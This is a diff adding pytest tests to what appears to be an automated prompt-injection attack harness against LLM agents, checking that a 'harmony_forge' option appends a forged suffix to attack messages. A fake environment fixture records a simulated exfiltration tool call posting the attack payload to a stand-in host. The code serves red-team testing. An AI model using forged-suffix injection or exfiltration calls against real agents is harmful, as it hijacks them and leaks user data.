@@ -108,6 +108,41 @@ def test_replay_stop_separate_wall_estimate():
     assert attack._replay_stop(60.0, 10.0, 50.0, 100.0, 1000.0, next_wall=5.0) is True
 
 
+class _RecEnv:
+    """Fake env that records every interacted message (fires exfil)."""
+    def __init__(self):
+        self.msgs = []; self._last = None; self.seed = 123
+    def reset(self, *a, **k):
+        self._last = {"tool_events": [], "user_messages": []}
+    def interact(self, msg, max_tool_hops=None):
+        self.msgs.append(msg)
+        self._last = {"tool_events": [{"name": "http.post", "ok": True,
+                      "args": {"url": "http://x.co", "data": attack.PAYLOAD}}],
+                      "user_messages": [msg]}
+    def export_trace_dict(self):
+        return self._last
+
+
+def test_unconditional_forge_when_split_off():
+    # forge on + split OFF -> every candidate (after the warm-up) is forged
+    algo = attack.AttackAlgorithm(config={"harmony_forge": True, "split_by_latency": False,
+                                          "slowest0": 0.01, "replay_safe_frac": 0.9})
+    env = _RecEnv()
+    out = algo.run(env, attack.AttackRunConfig(time_budget_s=0.3, max_tool_hops=8))
+    assert len(out) >= 1
+    candidate_msgs = env.msgs[1:]  # msgs[0] is the untimed warm-up
+    assert candidate_msgs and all(m.endswith(attack.FORGE_SUFFIX) for m in candidate_msgs)
+
+
+def test_no_forge_when_split_off_and_forge_off():
+    # forge OFF + split OFF -> plain (regression: Phase 1 default behavior)
+    algo = attack.AttackAlgorithm(config={"harmony_forge": False, "split_by_latency": False,
+                                          "slowest0": 0.01, "replay_safe_frac": 0.9})
+    env = _RecEnv()
+    algo.run(env, attack.AttackRunConfig(time_budget_s=0.3, max_tool_hops=8))
+    assert env.msgs and not any(m.endswith(attack.FORGE_SUFFIX) for m in env.msgs)
+
+
 def test_family_msg_deputy_forge_appends_suffix():
     plain = attack._family_msg("deputy", 2, forge=False)
     forged = attack._family_msg("deputy", 2, forge=True)
